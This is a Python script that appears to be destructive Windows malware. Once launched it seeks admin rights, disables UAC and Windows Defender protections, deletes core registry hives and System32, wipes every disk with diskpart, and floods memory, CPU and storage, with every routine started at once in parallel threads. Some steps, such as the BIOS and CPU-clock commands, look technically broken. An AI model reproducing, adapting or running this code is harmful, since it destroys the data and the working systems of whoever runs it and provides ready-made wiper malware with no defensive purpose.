import os
import ctypes
import subprocess
import threading
import random

def escalate_privileges():
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", "python", __file__, None, 1)
    except:
        pass

def disable_security():
    commands = [
        "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f",
        "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
        "powershell Set-MpPreference -DisableBehaviorMonitoring $true",
        "powershell Set-MpPreference -DisableIOAVProtection $true"
    ]
    for cmd in commands:
        subprocess.run(cmd, shell=True)

def corrupt_firmware():
    try:
        os.system("wmic bios get smbiosbiosversion | findstr . > nul && wmic bios set smbiosbiosversion='CORRUPTED'")
        subprocess.run("reg add HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS /v BIOSVersion /t REG_SZ /d 'NULL' /f", shell=True)
    except:
        pass

def destroy_registry():
    os.system("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion /f")
    os.system("reg delete HKLM\\SYSTEM /f")

def corrupt_disk():
    disks = subprocess.check_output("wmic diskdrive get DeviceID", shell=True).decode()
    for disk in disks.split('\n'):
        if "DeviceID" not in disk and disk.strip():
            subprocess.run(f"diskpart /s /c 'select disk {disk.strip()} & clean'", shell=True)

def ram_flood():
    try:
        while True:
            _ = "X" * (5 * 1024 * 1024 * 1024)
    except MemoryError:
        pass


def cpu_overclock():
    subprocess.run("wmic cpu set CurrentClockSpeed=999999", shell=True)

def fill_disk():
    path = "C:\\disk_overload"
    os.makedirs(path, exist_ok=True)
    while True:
        file_name = f"{path}\\{random.randint(1000, 9999)}.bin"
        with open(file_name, "wb") as f:
            f.write(os.urandom(500 * 1024 * 1024)) 

def fork_bomb():
    while True:
        threading.Thread(target=fork_bomb).start()
      
def nuke_system32():
    os.system("takeown /f C:\\Windows\\System32 /r /d y")
    os.system("icacls C:\\Windows\\System32 /grant Everyone:F /t")
    os.system("del C:\\Windows\\System32 /f /s /q")

def initiate_destruction():
    threading.Thread(target=escalate_privileges).start()
    threading.Thread(target=disable_security).start()
    threading.Thread(target=destroy_registry).start()
    threading.Thread(target=corrupt_firmware).start()
    threading.Thread(target=corrupt_disk).start()
    threading.Thread(target=ram_flood).start()
    threading.Thread(target=cpu_overclock).start()
    threading.Thread(target=fill_disk).start()
    threading.Thread(target=fork_bomb).start()
    threading.Thread(target=nuke_system32).start()
    print("[!] Full Destruction Initiated")

if __name__ == "__main__":
    initiate_destruction()
